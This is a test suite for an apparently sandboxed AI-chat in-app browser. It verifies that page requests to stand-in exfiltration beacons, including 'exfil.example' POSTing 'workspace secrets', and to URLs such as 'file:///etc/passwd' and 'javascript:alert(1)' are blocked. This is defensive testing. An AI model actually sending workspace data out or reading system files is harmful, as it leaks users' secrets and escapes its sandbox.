/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

/**
 * A sandboxed chat's in-app browser (B-16, INV-19). WEB-6 runs at integration level: a fake
 * partition plays Chromium's part (the session's request dispatcher, then its proxy settings:
 * bypass list or proxy) with Volt's real verdict function, proxy configuration and filtering proxy,
 * against a local "exfiltration" server that counts what reaches it. The Electron session wiring
 * itself (`sandboxBrowserSessions.ts`) needs the running app and is not exercised here.
 */

import assert from 'assert';
import * as http from 'http';
import * as net from 'net';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { SandboxNetworkProxy } from '../../../voltSandbox/node/sandboxProxy.js';
import { isSandboxBrowserPartition, ISandboxBrowserRules, sandboxBrowserPartition, sandboxBrowserProxyConfig, sandboxBrowserRequestVerdict } from '../../common/sandboxBrowser.js';
import { isPreviewPartition } from '../../common/browserCookies.js';

const OFF: ISandboxBrowserRules = { network: false, allowedDomains: [], listenPorts: [] };

/** What Chromium does with one request of a page in the partition: the dispatcher, then direct or through the session proxy. */
class FakeSandboxPartition {
	constructor(private readonly rules: ISandboxBrowserRules | undefined, private readonly proxyPort: number | undefined) { }

	async request(url: string, options: { readonly hasFrame?: boolean } = {}): Promise<'blocked' | number> {
		const verdict = sandboxBrowserRequestVerdict(this.rules, { url, hasFrame: options.hasFrame ?? true });
		if (!verdict.allow || !this.rules) {
			return 'blocked';
		}
		const target = new URL(url.replace(/^ws/, 'http'));
		const port = Number(target.port || (target.protocol === 'https:' ? 443 : 80));
		const config = sandboxBrowserProxyConfig(this.rules, this.proxyPort);
		const direct = config.mode === 'direct' || config.proxyBypassRules.split(',').includes(`${target.hostname}:${port}`);
		if (direct) {
			return send({ host: target.hostname.replace(/^\[|\]$/g, ''), port, path: target.pathname });
		}
		const proxy = new URL(config.proxyRules);
		return send({ host: proxy.hostname, port: Number(proxy.port), path: target.href, headers: { host: target.host } });
	}
}

function send(options: http.RequestOptions): Promise<number> {
	return new Promise(resolve => {
		const req = http.request({ ...options, method: 'POST', timeout: 3_000 }, res => {
			res.resume();
			res.on('end', () => resolve(res.statusCode ?? 0));
		});
		req.on('error', () => resolve(-1));
		req.on('timeout', () => req.destroy());
		req.end('workspace secrets');
	});
}

suite('Volt sandboxed chat browser (B-16)', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	let server: http.Server;
	let port: number;
	let hits: string[];
	let proxy: SandboxNetworkProxy | undefined;

	setup(async () => {
		hits = [];
		server = http.createServer((req, res) => {
			hits.push(`${req.method} ${req.url}`);
			res.end('ok');
		});
		await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve));
		port = (server.address() as net.AddressInfo).port;
	});

	teardown(async () => {
		proxy?.dispose();
		proxy = undefined;
		await new Promise(resolve => server.close(resolve));
	});

	test('each chat gets its own signed-out (in-memory) profile that cookie import refuses', () => {
		const a = sandboxBrowserPartition('chat-1');
		assert.ok(isSandboxBrowserPartition(a));
		assert.ok(!a.startsWith('persist:'), 'not persisted: nothing of the user\'s, nothing kept');
		assert.notStrictEqual(sandboxBrowserPartition('chat/1'), sandboxBrowserPartition('chat_1'));
		assert.ok(!isPreviewPartition(a), 'cookies cannot be imported into it');
		assert.ok(!isSandboxBrowserPartition('persist:volt-browser'));
		assert.ok(!isSandboxBrowserPartition('volt-sandbox-browser-../x'));
	});

	test('the dispatcher: unknown chat, no frame and non-web schemes are refused; data and about pass', () => {
		const ok = (rules: ISandboxBrowserRules | undefined, url: string, hasFrame = true) => sandboxBrowserRequestVerdict(rules, { url, hasFrame }).allow;
		assert.strictEqual(ok(undefined, 'https://example.com'), false, 'web contents Volt cannot tie to a chat');
		assert.strictEqual(ok({ ...OFF, network: true }, 'https://example.com', false), false, 'a request without a frame');
		for (const url of ['file:///etc/passwd', 'chrome://settings', 'javascript:alert(1)', 'ftp://x.example/']) {
			assert.strictEqual(ok({ ...OFF, network: true }, url), false, url);
		}
		for (const url of ['about:blank', 'data:text/html,hi', 'blob:https://x.example/1']) {
			assert.strictEqual(ok(OFF, url), true, url);
		}
		assert.strictEqual(ok({ ...OFF, allowedDomains: ['*.example.com'] }, 'https://api.example.com/x'), true);
		assert.strictEqual(ok({ ...OFF, allowedDomains: ['*.example.com'] }, 'https://example.org/x'), false);
		assert.strictEqual(ok({ ...OFF, listenPorts: [3000] }, 'http://localhost:3000/'), true);
		assert.strictEqual(ok({ ...OFF, listenPorts: [3000] }, 'http://localhost:3001/'), false);
		assert.strictEqual(ok({ ...OFF, network: true }, 'http://localhost:3001/'), true, 'network on: as the agent itself');
	});

	test('the session proxy: none with the network on; otherwise Volt\'s, without the implicit loopback bypass', () => {
		assert.deepStrictEqual(sandboxBrowserProxyConfig({ ...OFF, network: true }, 1234), { mode: 'direct' });
		assert.deepStrictEqual(sandboxBrowserProxyConfig({ ...OFF, listenPorts: [5173] }, 1234), {
			mode: 'fixed_servers',
			proxyRules: 'http://127.0.0.1:1234',
			proxyBypassRules: '<-loopback>,localhost:5173,127.0.0.1:5173,[::1]:5173',
		});
		assert.strictEqual((sandboxBrowserProxyConfig(OFF, undefined) as { proxyRules: string }).proxyRules, 'http://127.0.0.1:9', 'no proxy yet: a dead end, never direct');
	});

	test('WEB-6: a network-off sandboxed chat\'s page beacon reaches nothing', async () => {
		proxy = await SandboxNetworkProxy.start([], () => undefined, { lookup: async () => [{ address: '127.0.0.1', family: 4 }] });
		const page = new FakeSandboxPartition(OFF, proxy.port);
		const beacons = [
			`http://127.0.0.1:${port}/beacon`,
			`http://localhost:${port}/beacon`,
			`http://[::1]:${port}/beacon`,
			`http://exfil.example:${port}/beacon`,
			`ws://127.0.0.1:${port}/socket`,
			`http://0.0.0.0:${port}/beacon`,
		];
		for (const url of beacons) {
			await page.request(url);
		}
		await page.request(`http://127.0.0.1:${port}/no-frame`, { hasFrame: false });
		assert.deepStrictEqual(hits, [], 'the test host received nothing');

		// Even a host the user allowed is refused when it resolves to a local address (the proxy's rule).
		const refused: string[] = [];
		const allowedProxy = await SandboxNetworkProxy.start([`exfil.example:${port}`], (_host, reason) => refused.push(reason), { lookup: async () => [{ address: '127.0.0.1', family: 4 }] });
		try {
			const allowing = new FakeSandboxPartition({ ...OFF, allowedDomains: ['exfil.example'] }, allowedProxy.port);
			assert.strictEqual(await allowing.request(`http://exfil.example:${port}/beacon`), 403);
			assert.deepStrictEqual(refused, ['private-address']);
			assert.deepStrictEqual(hits, []);
		} finally {
			allowedProxy.dispose();
		}

		// The harness does deliver: the same beacon to a port the user granted lands.
		const granted = new FakeSandboxPartition({ ...OFF, listenPorts: [port] }, proxy.port);
		assert.strictEqual(await granted.request(`http://127.0.0.1:${port}/granted`), 200);
		assert.deepStrictEqual(hits, ['POST /granted']);
	});
});
